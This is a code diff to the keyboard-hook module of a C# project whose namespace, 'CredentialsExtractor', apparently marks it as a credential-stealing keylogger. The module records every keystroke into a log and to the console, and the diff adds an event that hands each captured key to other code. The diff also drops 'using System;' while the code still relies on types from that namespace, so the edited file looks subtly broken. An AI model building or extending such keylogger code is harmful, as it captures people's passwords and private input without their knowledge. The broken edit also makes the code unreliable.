@@ -1,6 +1,5 @@
-﻿using System;
+﻿// KeyboardManager.cs - Updated implementation
 using System.Text;
-using CredentialsExtractor.Input;
 using CredentialsExtractor.Logging;
 
 namespace CredentialsExtractor.Input
@@ -18,6 +17,9 @@ namespace CredentialsExtractor.Input
         private bool _leftShiftPressed = false;
         private bool _rightShiftPressed = false;
         private bool _capsLockOn = false;
+
+        // Added - Event to notify about detected keystrokes
+        public event EventHandler<KeystrokeEventArgs> KeystrokeDetected;
 
         public KeyboardManager(IKeyboardHookFactory keyboardHookFactory, IKeyboardUtils keyboardUtils, ILogger logger)
         {
@@ -82,8 +84,6 @@ namespace CredentialsExtractor.Input
 
         private void OnKeyPressed(object sender, KeyPressEventArgs eventArgs)
         {
-            if (!_isLoggingEnabled) return;
-
             int vkCode = eventArgs.VirtualKeyCode;
 
             if (eventArgs.IsKeyDown)
@@ -144,14 +144,20 @@ namespace CredentialsExtractor.Input
             // Get the character representation of the key
             string keyChar = _keyboardUtils.GetKeyChar(vkCode, shiftActive, _capsLockOn);
 
-            // Add to key log
-            _keyLog.Append(keyChar);
+            // Add to key log if logging is enabled
+            if (_isLoggingEnabled)
+            {
+                _keyLog.Append(keyChar);
 
-            // Log the key press (for debugging/monitoring)
-            _logger.Log($"Key: {keyChar}");
+                // Log the key press (for debugging/monitoring)
+                _logger.Log($"Key: {keyChar}");
 
-            // Optional: Output to console for immediate feedback
-            Console.Write(keyChar);
+                // Optional: Output to console for immediate feedback
+                Console.Write(keyChar);
+
+                // Raise the keystroke event
+                KeystrokeDetected?.Invoke(this, new KeystrokeEventArgs { Key = keyChar, VirtualKeyCode = vkCode });
+            }
         }
 
         public void Dispose()
@@ -178,5 +184,12 @@ namespace CredentialsExtractor.Input
         {
             Dispose(false);
         }
+    }
+
+    // Added - Keystroke event arguments
+    public class KeystrokeEventArgs : EventArgs
+    {
+        public string Key { get; set; }
+        public int VirtualKeyCode { get; set; }
     }
 }
